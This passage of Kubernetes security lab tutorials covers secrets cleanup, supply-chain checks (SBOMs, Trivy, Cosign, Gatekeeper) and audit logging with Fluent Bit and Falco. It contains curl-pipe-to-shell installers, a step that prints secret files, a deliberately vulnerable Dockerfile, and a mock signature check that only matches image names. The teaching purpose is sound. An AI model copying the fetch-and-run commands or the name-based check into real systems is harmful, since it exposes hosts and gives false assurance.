
chmod +x secret-scanner.sh
./secret-scanner.sh

Subtask 4.2: Monitor Secret Access

Step 1: Enable audit logging for secrets (demonstration)

Create a file named audit-policy.yaml:

apiVersion: audit.k8s.io/v1
kind: Policy
rules:
- level: Metadata
  resources:
  - group: ""
    resources: ["secrets"]
  verbs: ["get", "list", "create", "update", "patch", "delete"]

Step 2: Create a monitoring script

Create a file named monitor-secrets.sh:

#!/bin/bash

echo "Monitoring secret access patterns..."

# List all secrets and their age
echo "=== Current Secrets ==="
kubectl get secrets -o custom-columns=NAME:.metadata.name,AGE:.metadata.creationTimestamp

# Check which pods are using secrets
echo "=== Pods using secrets ==="
kubectl get pods -o yaml | grep -A 5 -B 5 secretKeyRef

# List service accounts with secret access
echo "=== Service accounts with secret access ==="
kubectl get rolebindings -o yaml | grep -A 10 -B 5 secrets

echo "Monitoring completed"

Make it executable and run:

chmod +x monitor-secrets.sh
./monitor-secrets.sh

Verification and Testing
Step 1: Comprehensive Secret Verification

# Verify all secrets are created and accessible
echo "=== Verifying all secrets ==="
kubectl get secrets

# Test environment variable access
kubectl exec secret-env-pod -- printenv | grep -E "(DB_|DATABASE_)"

# Test volume mount access
kubectl exec secret-volume-pod -- find /etc/secrets -type f -exec echo "File: {}" \; -exec cat {} \;

# Test Vault integration
kubectl logs vault-sidecar-pod -c myapp | tail -10

Step 2: Security Validation

# Verify RBAC is working
kubectl auth can-i create secrets --as=system:serviceaccount:default:secret-reader
kubectl auth can-i get secrets --as=system:serviceaccount:default:secret-reader

# Check for any security issues
kubectl get pods --all-namespaces -o yaml | grep -i "privileged\|hostNetwork\|hostPID" || echo "No obvious security issues found"

Cleanup

# Stop Vault server
pkill vault

# Delete all created resources
kubectl delete pod secret-env-pod secret-volume-pod vault-sidecar-pod
kubectl delete secret user-credentials file-credentials database-secret tls-secret test-encryption
kubectl delete configmap vault-agent-config
kubectl delete serviceaccount vault-auth secret-reader
kubectl delete role secret-reader-role
kubectl delete rolebinding secret-reader-binding

# Remove created files
rm -f database-secret.yaml pod-env-secrets.yaml pod-volume-secrets.yaml
rm -f vault-agent-config.yaml vault-sidecar-pod.yaml secret-rbac.yaml
rm -f encryption-config.yaml audit-policy.yaml
rm -f rotate-secret.sh secret-scanner.sh monitor-secrets.sh

Troubleshooting Tips
Common Issues and Solutions

Issue 1: Vault server fails to start

    Solution: Check if port 8200 is already in use: netstat -tlnp | grep 8200
    Kill any existing processes and restart Vault

Issue 2: Pods cannot access secrets

    Solution: Verify secret names and keys match exactly in pod specifications
    Check RBAC permissions for the service account

Issue 3: Base64 encoding issues

    Solution: Use echo -n to avoid newline characters when encoding
    Verify encoding with: echo "value" | base64 | base64 --decode

Issue 4: Vault authentication fails

    Solution: Ensure the service account token is valid
    Check Kubernetes API server accessibility from Vault

Conclusion

In this comprehensive lab, you have successfully:

• Created and managed Kubernetes Secrets using multiple methods including imperative commands, file-based creation, and YAML manifests • Implemented secure secret consumption by mounting secrets as both environment variables and volumes in pods • Integrated HashiCorp Vault as an external secrets management solution with Kubernetes authentication • Verified encryption at rest and implemented proper RBAC controls for secret access • Established security best practices including secret rotation, scanning, and monitoring
Key Takeaways

Security Best Practices: You learned that secrets should never be stored in plain text and should always be encrypted both at rest and in transit. The integration with external tools like Vault provides enterprise-grade secrets management capabilities.

Operational Excellence: The lab demonstrated how to implement proper secret lifecycle management, including creation, rotation, and monitoring, which are essential for maintaining security in production environments.

Compliance and Auditing: By implementing RBAC controls and monitoring capabilities, you've established the foundation for meeting compliance requirements and maintaining audit trails for secret access.

This knowledge is crucial for the Certified Kubernetes Security Specialist (CKS) certification and real-world Kubernetes security implementations. The skills you've developed will help you secure sensitive data in containerized applications and meet enterprise security requirements.
Next Steps

Consider exploring advanced topics such as: • Implementing secrets management with other tools like AWS Secrets Manager or Azure Key Vault • Setting up automated secret rotation with operators • Integrating secrets management with CI/CD pipelines • Implementing zero-trust security models for Kubernetes workloads





Lab 6: Supply Chain Security
Objectives

By the end of this lab, you will be able to:

• Generate and analyze Software Bill of Materials (SBOM) for container images to understand dependencies • Scan container images for security vulnerabilities using Trivy • Sign container images with Cosign for authenticity verification • Configure Kubernetes admission controllers to enforce signed image policies • Implement supply chain security best practices in containerized environments
Prerequisites

Before starting this lab, you should have:

• Basic understanding of Docker containers and container images • Familiarity with Kubernetes concepts (pods, deployments, admission controllers) • Knowledge of Linux command line operations • Understanding of public key cryptography concepts • Basic knowledge of YAML configuration files
Lab Environment

Al Nafi provides ready-to-use Linux-based cloud machines for this lab. Simply click Start Lab to access your pre-configured environment. No need to build your own VM or install additional software - everything is ready to go!

Your lab environment includes: • Ubuntu 22.04 LTS with Docker installed • Kubernetes cluster (kind) pre-configured • All required tools pre-installed: Trivy, Cosign, Syft, kubectl
Task 1: Generate and Analyze Software Bill of Materials (SBOM)
Subtask 1.1: Understanding SBOM Concepts

A Software Bill of Materials (SBOM) is a comprehensive inventory of all components, libraries, and dependencies used in a software application. Think of it like an ingredient list on food packaging - it tells you exactly what's inside your container image.
Subtask 1.2: Install and Configure Syft

First, let's verify that Syft is available in your environment:

# Check if Syft is installed
syft version

# If not installed, install it
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin

Subtask 1.3: Pull a Sample Container Image

Let's work with a popular application image:

# Pull a sample application image
docker pull nginx:1.24-alpine

# Verify the image is available
docker images | grep nginx

Subtask 1.4: Generate SBOM for the Container Image

Now let's generate an SBOM for our nginx image:

# Generate SBOM in SPDX format
syft nginx:1.24-alpine -o spdx-json > nginx-sbom.spdx.json

# Generate SBOM in CycloneDX format
syft nginx:1.24-alpine -o cyclonedx-json > nginx-sbom.cyclonedx.json

# Generate human-readable table format
syft nginx:1.24-alpine -o table > nginx-sbom.txt

Subtask 1.5: Analyze the Generated SBOM

Let's examine what's inside our container:

# View the human-readable SBOM
cat nginx-sbom.txt

# Count the number of packages
cat nginx-sbom.txt | wc -l

# Look for specific package types
echo "=== Alpine Packages ==="
syft nginx:1.24-alpine -o table | grep "apk"

echo "=== Examining JSON SBOM structure ==="
jq '.packages[0:3]' nginx-sbom.spdx.json

Subtask 1.6: Generate SBOM for a More Complex Application

Let's try with a more complex application:

# Pull a Python application image
docker pull python:3.11-slim

# Generate SBOM for Python image
syft python:3.11-slim -o table > python-sbom.txt

# Compare package counts
echo "Nginx packages:"
cat nginx-sbom.txt | wc -l
echo "Python packages:"
cat python-sbom.txt | wc -l

# Look at Python-specific packages
syft python:3.11-slim -o table | grep -E "(python|pip)"

Task 2: Vulnerability Scanning with Trivy
Subtask 2.1: Understanding Container Vulnerability Scanning

Trivy is a comprehensive security scanner that detects vulnerabilities in container images, filesystems, and Git repositories. It's like having a security guard that checks every component in your container for known security issues.
Subtask 2.2: Basic Vulnerability Scanning

Let's scan our nginx image for vulnerabilities:

# Scan nginx image for vulnerabilities
trivy image nginx:1.24-alpine

# Scan with specific severity levels only
trivy image --severity HIGH,CRITICAL nginx:1.24-alpine

# Generate JSON report
trivy image -f json -o nginx-vuln-report.json nginx:1.24-alpine

Subtask 2.3: Detailed Vulnerability Analysis

Let's get more detailed information about vulnerabilities:

# Scan with more verbose output
trivy image --format table --severity HIGH,CRITICAL nginx:1.24-alpine

# Check for specific vulnerability types
trivy image --vuln-type os nginx:1.24-alpine

# Scan for both OS and library vulnerabilities
trivy image --vuln-type os,library python:3.11-slim

Subtask 2.4: Create a Custom Vulnerable Image

Let's create an intentionally vulnerable image to see Trivy in action:

# Create a Dockerfile with an older, vulnerable base image
cat > Dockerfile.vulnerable << 'EOF'
FROM ubuntu:18.04
RUN apt-get update && apt-get install -y \
    curl \
    wget \
    openssl=1.1.1-1ubuntu2.1~18.04.20 \
    && rm -rf /var/lib/apt/lists/*
COPY app.py /app/
WORKDIR /app
CMD ["python3", "app.py"]
EOF

# Create a simple Python app
cat > app.py << 'EOF'
#!/usr/bin/env python3
print("Hello from vulnerable container!")
EOF

# Build the vulnerable image
docker build -f Dockerfile.vulnerable -t vulnerable-app:latest .

# Scan the vulnerable image
trivy image --severity HIGH,CRITICAL vulnerable-app:latest

Subtask 2.5: Compare Vulnerability Reports

Let's compare different images:

# Scan multiple images and compare
echo "=== Scanning Alpine-based nginx ==="
trivy image --severity HIGH,CRITICAL --quiet nginx:1.24-alpine | wc -l

echo "=== Scanning Ubuntu-based vulnerable app ==="
trivy image --severity HIGH,CRITICAL --quiet vulnerable-app:latest | wc -l

# Generate comparison report
trivy image --format json nginx:1.24-alpine > nginx-scan.json
trivy image --format json vulnerable-app:latest > vulnerable-scan.json

# Count vulnerabilities in each
echo "Nginx HIGH/CRITICAL vulnerabilities:"
jq '[.Results[]?.Vulnerabilities[]? | select(.Severity == "HIGH" or .Severity == "CRITICAL")] | length' nginx-scan.json

echo "Vulnerable app HIGH/CRITICAL vulnerabilities:"
jq '[.Results[]?.Vulnerabilities[]? | select(.Severity == "HIGH" or .Severity == "CRITICAL")] | length' vulnerable-scan.json

Task 3: Image Signing with Cosign
Subtask 3.1: Understanding Image Signing

Image signing is like putting a tamper-evident seal on your container images. It ensures that the image you're running is exactly what the publisher intended, without any malicious modifications.
Subtask 3.2: Generate Signing Keys

Let's create a key pair for signing images:

# Generate a key pair for signing
cosign generate-key-pair

# This will create cosign.key (private) and cosign.pub (public)
# You'll be prompted to enter a password for the private key
# For this lab, use password: "lab123"

# Verify the keys were created
ls -la cosign.*

Subtask 3.3: Sign Container Images

Now let's sign our images:

# Sign the nginx image
cosign sign --key cosign.key nginx:1.24-alpine

# Sign our vulnerable app image
cosign sign --key cosign.key vulnerable-app:latest

# Verify the signatures
cosign verify --key cosign.pub nginx:1.24-alpine
cosign verify --key cosign.pub vulnerable-app:latest

Subtask 3.4: Create and Sign a Secure Image

Let's create a more secure image and sign it:

# Create a secure Dockerfile
cat > Dockerfile.secure << 'EOF'
FROM nginx:1.24-alpine
RUN addgroup -g 1001 -S appgroup && \
    adduser -u 1001 -S appuser -G appgroup
USER appuser
COPY --chown=appuser:appgroup index.html /usr/share/nginx/html/
EXPOSE 8080
EOF

# Create a simple HTML file
cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Secure App</title></head>
<body><h1>This is a signed, secure container!</h1></body>
</html>
EOF

# Build the secure image
docker build -f Dockerfile.secure -t secure-app:v1.0 .

# Sign the secure image
cosign sign --key cosign.key secure-app:v1.0

# Verify the signature
cosign verify --key cosign.pub secure-app:v1.0

Subtask 3.5: Keyless Signing (Advanced)

Cosign also supports keyless signing using OIDC identity:

# For demonstration, let's see keyless signing syntax
# (This requires OIDC setup, so we'll show the commands)
echo "Keyless signing command (for reference):"
echo "cosign sign secure-app:v1.0"
echo "cosign verify --certificate-identity=user@example.com --certificate-oidc-issuer=https://github.com/login/oauth secure-app:v1.0"

Task 4: Configure Kubernetes to Enforce Signed Images
Subtask 4.1: Set Up Kubernetes Cluster

Let's verify our Kubernetes cluster is ready:

# Check cluster status
kubectl cluster-info

# Create a namespace for our testing
kubectl create namespace supply-chain-demo

# Set the namespace as default for convenience
kubectl config set-context --current --namespace=supply-chain-demo

Subtask 4.2: Create ConfigMap with Public Key

We need to make our public key available to the cluster:

# Create a ConfigMap with our public key
kubectl create configmap cosign-public-key --from-file=cosign.pub

# Verify the ConfigMap
kubectl get configmap cosign-public-key -o yaml

Subtask 4.3: Install and Configure Gatekeeper

We'll use OPA Gatekeeper as our admission controller:

# Install Gatekeeper
kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.14/deploy/gatekeeper.yaml

# Wait for Gatekeeper to be ready
kubectl wait --for=condition=Ready pod -l control-plane=controller-manager -n gatekeeper-system --timeout=300s

# Verify Gatekeeper is running
kubectl get pods -n gatekeeper-system

Subtask 4.4: Create Image Signature Policy

Let's create a policy that requires signed images:

# Create a ConstraintTemplate for image signature verification
cat > image-signature-template.yaml << 'EOF'
apiVersion: templates.gatekeeper.sh/v1beta1
kind: ConstraintTemplate
metadata:
  name: requireimagesignature
spec:
  crd:
    spec:
      names:
        kind: RequireImageSignature
      validation:
        openAPIV3Schema:
          type: object
          properties:
            publicKey:
              type: string
            exemptImages:
              type: array
              items:
                type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package requireimagesignature
        
        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          image := container.image
          not is_exempt(image)
          not is_signed(image)
          msg := sprintf("Image %v is not signed with required key", [image])
        }
        
        is_exempt(image) {
          input.parameters.exemptImages[_] == image
        }
        
        is_signed(image) {
          # This is a simplified check - in practice, you'd integrate with cosign
          # For this demo, we'll assume images with "secure" in the name are signed
          contains(image, "secure")
        }
EOF

# Apply the ConstraintTemplate
kubectl apply -f image-signature-template.yaml

# Verify the template was created
kubectl get constrainttemplates

Subtask 4.5: Create and Apply the Constraint

Now let's create a constraint that uses our template:

# Create a constraint that requires signed images
cat > require-signed-images.yaml << 'EOF'
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: RequireImageSignature
metadata:
  name: require-signed-images
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
      - apiGroups: ["apps"]
        kinds: ["Deployment"]
  parameters:
    publicKey: "cosign-public-key"
    exemptImages:
      - "registry.k8s.io/pause:*"
      - "kindest/kindnetd:*"
EOF

# Apply the constraint
kubectl apply -f require-signed-images.yaml

# Verify the constraint
kubectl get requireimagesignature

Subtask 4.6: Test the Policy Enforcement

Let's test our policy by trying to deploy signed and unsigned images:

# Try to deploy an unsigned image (should be blocked)
cat > unsigned-deployment.yaml << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: unsigned-app
spec:
  replicas: 1
  selector:
    matchLabels:
      app: unsigned-app
  template:
    metadata:
      labels:
        app: unsigned-app
    spec:
      containers:
      - name: nginx
        image: nginx:1.24-alpine
        ports:
        - containerPort: 80
EOF

# Try to apply (this should fail due to policy)
kubectl apply -f unsigned-deployment.yaml

# Deploy a "signed" image (contains "secure" in name)
cat > signed-deployment.yaml << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: secure-app
spec:
  replicas: 1
  selector:
    matchLabels:
      app: secure-app
  template:
    metadata:
      labels:
        app: secure-app
    spec:
      containers:
      - name: secure-nginx
        image: secure-app:v1.0
        ports:
        - containerPort: 8080
EOF

# This should succeed
kubectl apply -f signed-deployment.yaml

# Check the deployment status
kubectl get deployments
kubectl get pods

Subtask 4.7: Implement Real Cosign Verification (Advanced)

For a more realistic implementation, let's create a webhook that actually verifies cosign signatures:

# Create a simple verification script
cat > verify-signature.sh << 'EOF'
#!/bin/bash
IMAGE=$1
PUBLIC_KEY_PATH=$2

# Verify the image signature using cosign
cosign verify --key "$PUBLIC_KEY_PATH" "$IMAGE" > /dev/null 2>&1
if [ $? -eq 0 ]; then
    echo "Image $IMAGE is properly signed"
    exit 0
else
    echo "Image $IMAGE signature verification failed"
    exit 1
fi
EOF

chmod +x verify-signature.sh

# Test the verification script
./verify-signature.sh secure-app:v1.0 cosign.pub
./verify-signature.sh nginx:1.24-alpine cosign.pub

Task 5: Complete Supply Chain Security Workflow
Subtask 5.1: Create a Comprehensive Security Pipeline

Let's put everything together in a complete workflow:

# Create a script that combines all security checks
cat > security-pipeline.sh << 'EOF'
#!/bin/bash
set -e

IMAGE_NAME=$1
if [ -z "$IMAGE_NAME" ]; then
    echo "Usage: $0 <image-name>"
    exit 1
fi

echo "=== Supply Chain Security Pipeline ==="
echo "Processing image: $IMAGE_NAME"

# Step 1: Generate SBOM
echo "Step 1: Generating SBOM..."
syft "$IMAGE_NAME" -o spdx-json > "${IMAGE_NAME//[:\/]/_}-sbom.json"
echo "SBOM generated: ${IMAGE_NAME//[:\/]/_}-sbom.json"

# Step 2: Vulnerability Scan
echo "Step 2: Scanning for vulnerabilities..."
trivy image --severity HIGH,CRITICAL "$IMAGE_NAME" > "${IMAGE_NAME//[:\/]/_}-vulnerabilities.txt"
VULN_COUNT=$(trivy image --severity HIGH,CRITICAL --quiet "$IMAGE_NAME" | wc -l)
echo "Found $VULN_COUNT HIGH/CRITICAL vulnerabilities"

# Step 3: Check if image is signed
echo "Step 3: Verifying image signature..."
if cosign verify --key cosign.pub "$IMAGE_NAME" > /dev/null 2>&1; then
    echo "✓ Image is properly signed"
    SIGNED=true
else
    echo "✗ Image is not signed or signature verification failed"
    SIGNED=false
fi

# Step 4: Generate security report
echo "Step 4: Generating security report..."
cat > "${IMAGE_NAME//[:\/]/_}-security-report.txt" << EOL
Supply Chain Security Report
============================
Image: $IMAGE_NAME
Scan Date: $(date)

SBOM: Generated (${IMAGE_NAME//[:\/]/_}-sbom.json)
Vulnerabilities: $VULN_COUNT HIGH/CRITICAL issues found
Signature Status: $SIGNED

Recommendation: 
$(if [ "$VULN_COUNT" -gt 0 ] || [ "$SIGNED" = false ]; then
    echo "⚠️  This image has security concerns. Review vulnerabilities and ensure proper signing."
else
    echo "✅ This image passes basic security checks."
fi)
EOL

echo "Security report generated: ${IMAGE_NAME//[:\/]/_}-security-report.txt"
echo "=== Pipeline Complete ==="
EOF

chmod +x security-pipeline.sh

Subtask 5.2: Run the Complete Pipeline

Let's test our pipeline with different images:

# Test with our secure signed image
./security-pipeline.sh secure-app:v1.0

# Test with unsigned nginx image
./security-pipeline.sh nginx:1.24-alpine

# Test with vulnerable image
./security-pipeline.sh vulnerable-app:latest

# View the generated reports
ls -la *-security-report.txt
cat secure-app_v1.0-security-report.txt

Subtask 5.3: Create Policy as Code

Let's create a policy configuration file:

# Create a supply chain policy configuration
cat > supply-chain-policy.yaml << 'EOF'
apiVersion: v1
kind: ConfigMap
metadata:
  name: supply-chain-policy
  namespace: supply-chain-demo
data:
  policy.yaml: |
    supply_chain_policy:
      sbom_required: true
      vulnerability_scan_required: true
      max_critical_vulnerabilities: 0
      max_high_vulnerabilities: 5
      signature_required: true
      allowed_registries:
        - "docker.io"
        - "gcr.io"
        - "quay.io"
      blocked_images:
        - ".*:latest"  # Block latest tags
      required_labels:
        - "maintainer"
        - "version"
EOF

kubectl apply -f supply-chain-policy.yaml

Troubleshooting Common Issues
Issue 1: Cosign Key Generation Fails

# If cosign generate-key-pair fails, try:
export COSIGN_PASSWORD=lab123
cosign generate-key-pair --output-key-prefix=lab

Issue 2: Trivy Database Update Issues

# If Trivy scanning fails, update the vulnerability database:
trivy image --download-db-only

Issue 3: Gatekeeper Policy Not Working

# Check Gatekeeper logs:
kubectl logs -n gatekeeper-system -l control-plane=controller-manager

# Verify constraint status:
kubectl describe requireimagesignature require-signed-images

Issue 4: Docker Permission Issues

# If you get permission denied errors:
sudo usermod -aG docker $USER
newgrp docker

Conclusion

Congratulations! You have successfully completed the Supply Chain Security lab. Here's what you accomplished:
Key Achievements

• SBOM Generation: You learned how to create comprehensive Software Bills of Materials for container images, giving you complete visibility into all components and dependencies in your containers.

• Vulnerability Assessment: You mastered using Trivy to scan container images for security vulnerabilities, understanding how to identify and prioritize security risks in your supply chain.

• Image Signing and Verification: You implemented cryptographic signing of container images using Cosign, ensuring image authenticity and integrity throughout the deployment pipeline.

• Policy Enforcement: You configured Kubernetes admission controllers to automatically enforce supply chain security policies, preventing unsigned or vulnerable images from being deployed.

• Complete Security Pipeline: You created an integrated workflow that combines SBOM generation, vulnerability scanning, and signature verification into a comprehensive security pipeline.
Why This Matters

Supply chain security is critical in modern containerized environments because:

• Trust and Integrity: Signed images ensure you're running exactly what the publisher intended, preventing supply chain attacks • Vulnerability Management: Regular scanning helps identify and remediate security issues before they reach production • Compliance: Many regulatory frameworks now require SBOM generation and vulnerability tracking • Risk Reduction: Comprehensive supply chain security reduces the attack surface and potential for compromise
Real-World Applications

The skills you've learned apply directly to:

• DevSecOps Pipelines: Integrating security checks into CI/CD workflows • Kubernetes Security: Implementing admission controllers and security policies • Compliance Reporting: Generating SBOMs and vulnerability reports for audits • Container Registry Management: Ensuring only secure, signed images are stored and deployed
Next Steps

To further enhance your supply chain security knowledge:

• Explore advanced Cosign features like keyless signing with OIDC • Implement automated vulnerability remediation workflows • Study supply chain attack vectors and mitigation strategies • Practice with enterprise container registries and their security features

You now have the foundational skills to implement robust supply chain security practices in production Kubernetes environments, making you well-prepared for the Certified Kubernetes Security Specialist (CKS) certification and real-world security challenges.





Lab 7: Monitoring and Runtime Security
Objectives

By the end of this lab, students will be able to:

• Configure and enable Kubernetes audit logging to track cluster activities • Deploy and configure logging agents to collect runtime logs from Kubernetes clusters • Install and configure Falco for runtime security monitoring and threat detection • Simulate realistic attack scenarios including privilege escalation attempts • Analyze audit logs to identify attack patterns and trace security incidents • Implement detection rules for common Kubernetes security threats • Understand the correlation between audit logs and runtime security events • Develop incident response procedures based on security monitoring data
Prerequisites

Before starting this lab, students should have:

• Basic understanding of Kubernetes concepts (pods, services, deployments) • Familiarity with Linux command line operations • Knowledge of YAML configuration files • Understanding of container security fundamentals • Basic knowledge of log analysis and monitoring concepts • Completion of previous CKS labs or equivalent Kubernetes security experience
Lab Environment Setup

Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines for this lab. Simply click Start Lab to access your environment. No need to build your own VM or install additional software - everything is ready to use!

Your lab environment includes: • Ubuntu 20.04 LTS with Kubernetes cluster pre-installed • kubectl configured and ready to use • All necessary tools and dependencies pre-installed • Internet access for downloading additional components
Task 1: Enable Kubernetes Audit Logs and Configure Logging Agents
Subtask 1.1: Configure Kubernetes Audit Logging

First, we'll enable comprehensive audit logging for the Kubernetes API server to track all cluster activities.

Step 1: Create the audit policy configuration file

sudo mkdir -p /etc/kubernetes/audit

sudo tee /etc/kubernetes/audit/audit-policy.yaml > /dev/null <<EOF
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
# Log all requests at the Metadata level for security-sensitive resources
- level: Metadata
  resources:
  - group: ""
    resources: ["secrets", "configmaps"]
  - group: "rbac.authorization.k8s.io"
    resources: ["roles", "rolebindings", "clusterroles", "clusterrolebindings"]

# Log all authentication and authorization events
- level: Request
  users: ["system:anonymous"]
  verbs: ["*"]

# Log privilege escalation attempts
- level: RequestResponse
  resources:
  - group: ""
    resources: ["pods/exec", "pods/portforward", "pods/proxy"]

# Log all requests to security-sensitive namespaces
- level: Request
  namespaces: ["kube-system", "kube-public", "default"]

# Log all failed requests
- level: Request
  omitStages:
  - RequestReceived
  resources:
  - group: ""
    resources: ["*"]
  namespaceSelector:
    matchLabels:
      audit: "true"

# Catch-all rule for other requests
- level: Metadata
  omitStages:
  - RequestReceived
EOF

Step 2: Modify the API server configuration to enable audit logging

sudo cp /etc/kubernetes/manifests/kube-apiserver.yaml /etc/kubernetes/manifests/kube-apiserver.yaml.backup

sudo tee /tmp/apiserver-patch.yaml > /dev/null <<EOF
spec:
  containers:
  - name: kube-apiserver
    command:
    - kube-apiserver
    - --audit-log-path=/var/log/kubernetes/audit.log
    - --audit-policy-file=/etc/kubernetes/audit/audit-policy.yaml
    - --audit-log-maxage=30
    - --audit-log-maxbackup=10
    - --audit-log-maxsize=100
    volumeMounts:
    - name: audit-policy
      mountPath: /etc/kubernetes/audit
      readOnly: true
    - name: audit-logs
      mountPath: /var/log/kubernetes
  volumes:
  - name: audit-policy
    hostPath:
      path: /etc/kubernetes/audit
      type: DirectoryOrCreate
  - name: audit-logs
    hostPath:
      path: /var/log/kubernetes
      type: DirectoryOrCreate
EOF

Step 3: Apply the audit configuration by updating the API server manifest

# Create the log directory
sudo mkdir -p /var/log/kubernetes

# Update the kube-apiserver manifest
sudo python3 -c "
import yaml
import sys

# Read the original manifest
with open('/etc/kubernetes/manifests/kube-apiserver.yaml', 'r') as f:
    manifest = yaml.safe_load(f)

# Add audit parameters to command
container = manifest['spec']['containers'][0]
audit_flags = [
    '--audit-log-path=/var/log/kubernetes/audit.log',
    '--audit-policy-file=/etc/kubernetes/audit/audit-policy.yaml',
    '--audit-log-maxage=30',
    '--audit-log-maxbackup=10',
    '--audit-log-maxsize=100'
]

for flag in audit_flags:
    if flag not in container['command']:
        container['command'].append(flag)

# Add volume mounts
if 'volumeMounts' not in container:
    container['volumeMounts'] = []

volume_mounts = [
    {'name': 'audit-policy', 'mountPath': '/etc/kubernetes/audit', 'readOnly': True},
    {'name': 'audit-logs', 'mountPath': '/var/log/kubernetes'}
]

for vm in volume_mounts:
    if not any(existing['name'] == vm['name'] for existing in container['volumeMounts']):
        container['volumeMounts'].append(vm)

# Add volumes
if 'volumes' not in manifest['spec']:
    manifest['spec']['volumes'] = []

volumes = [
    {'name': 'audit-policy', 'hostPath': {'path': '/etc/kubernetes/audit', 'type': 'DirectoryOrCreate'}},
    {'name': 'audit-logs', 'hostPath': {'path': '/var/log/kubernetes', 'type': 'DirectoryOrCreate'}}
]

for vol in volumes:
    if not any(existing['name'] == vol['name'] for existing in manifest['spec']['volumes']):
        manifest['spec']['volumes'].append(vol)

# Write the updated manifest
with open('/etc/kubernetes/manifests/kube-apiserver.yaml', 'w') as f:
    yaml.dump(manifest, f, default_flow_style=False)
"

Step 4: Wait for the API server to restart and verify audit logging

# Wait for API server to restart (this may take 1-2 minutes)
echo "Waiting for API server to restart with audit logging enabled..."
sleep 60

# Check if audit log file is being created
sudo ls -la /var/log/kubernetes/

# Verify API server is running
kubectl get nodes

# Generate some activity to create audit logs
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces

Subtask 1.2: Deploy Fluent Bit for Log Collection

Now we'll deploy Fluent Bit as a DaemonSet to collect logs from all nodes in the cluster.

Step 1: Create namespace for logging

kubectl create namespace logging

Step 2: Create Fluent Bit configuration

kubectl apply -f - <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: fluent-bit-config
  namespace: logging
data:
  fluent-bit.conf: |
    [SERVICE]
        Flush         1
        Log_Level     info
        Daemon        off
        Parsers_File  parsers.conf
        HTTP_Server   On
        HTTP_Listen   0.0.0.0
        HTTP_Port     2020

    [INPUT]
        Name              tail
        Path              /var/log/containers/*.log
        Parser            docker
        Tag               kube.*
        Refresh_Interval  5
        Mem_Buf_Limit     50MB
        Skip_Long_Lines   On

    [INPUT]
        Name              tail
        Path              /var/log/kubernetes/audit.log
        Parser            json
        Tag               audit.*
        Refresh_Interval  5
        Mem_Buf_Limit     50MB

    [FILTER]
        Name                kubernetes
        Match               kube.*
        Kube_URL            https://kubernetes.default.svc:443
        Kube_CA_File        /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
        Kube_Token_File     /var/run/secrets/kubernetes.io/serviceaccount/token
        Kube_Tag_Prefix     kube.var.log.containers.
        Merge_Log           On
        Keep_Log            Off
        K8S-Logging.Parser  On
        K8S-Logging.Exclude On

    [OUTPUT]
        Name  stdout
        Match *

  parsers.conf: |
    [PARSER]
        Name   docker
        Format json
        Time_Key time
        Time_Format %Y-%m-%dT%H:%M:%S.%L
        Time_Keep   On

    [PARSER]
        Name        json
        Format      json
        Time_Key    timestamp
        Time_Format %Y-%m-%dT%H:%M:%S.%L
        Time_Keep   On
EOF

Step 3: Deploy Fluent Bit DaemonSet

kubectl apply -f - <<EOF
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: fluent-bit
  namespace: logging
  labels:
    k8s-app: fluent-bit-logging
    version: v1
    kubernetes.io/cluster-service: "true"
spec:
  selector:
    matchLabels:
      k8s-app: fluent-bit-logging
  template:
    metadata:
      labels:
        k8s-app: fluent-bit-logging
        version: v1
        kubernetes.io/cluster-service: "true"
    spec:
      containers:
      - name: fluent-bit
        image: fluent/fluent-bit:2.2.0
        imagePullPolicy: Always
        ports:
          - containerPort: 2020
        volumeMounts:
        - name: varlog
          mountPath: /var/log
        - name: varlibdockercontainers
          mountPath: /var/lib/docker/containers
          readOnly: true
        - name: fluent-bit-config
          mountPath: /fluent-bit/etc/
        - name: mnt
          mountPath: /mnt
          readOnly: true
      terminationGracePeriodSeconds: 10
      volumes:
      - name: varlog
        hostPath:
          path: /var/log
      - name: varlibdockercontainers
        hostPath:
          path: /var/lib/docker/containers
      - name: fluent-bit-config
        configMap:
          name: fluent-bit-config
      - name: mnt
        hostPath:
          path: /mnt
      serviceAccountName: fluent-bit
      tolerations:
      - key: node-role.kubernetes.io/master
        operator: Exists
        effect: NoSchedule
      - operator: "Exists"
        effect: "NoExecute"
      - operator: "Exists"
        effect: "NoSchedule"
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: fluent-bit
  namespace: logging
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: fluent-bit-read
rules:
- apiGroups: [""]
  resources:
  - namespaces
  - pods
  verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: fluent-bit-read
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: fluent-bit-read
subjects:
- kind: ServiceAccount
  name: fluent-bit
  namespace: logging
EOF

Step 4: Verify Fluent Bit deployment

# Check if Fluent Bit pods are running
kubectl get pods -n logging

# Check Fluent Bit logs to ensure it's collecting data
kubectl logs -n logging -l k8s-app=fluent-bit-logging --tail=50

Task 2: Deploy Falco for Runtime Security Monitoring
Subtask 2.1: Install and Configure Falco

Falco is a runtime security monitoring tool that detects anomalous activity in applications and containers.

Step 1: Add Falco Helm repository and install Falco

# Install Helm if not already installed
curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash

# Add Falco Helm repository
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

Step 2: Create custom Falco configuration

kubectl create namespace falco-system

# Create custom Falco values file
cat > falco-values.yaml <<EOF
falco:
  grpc:
    enabled: true
  grpcOutput:
    enabled: true
  jsonOutput: true
  jsonIncludeOutputProperty: true
  logLevel: info
  
  rules_file:
    - /etc/falco/falco_rules.yaml
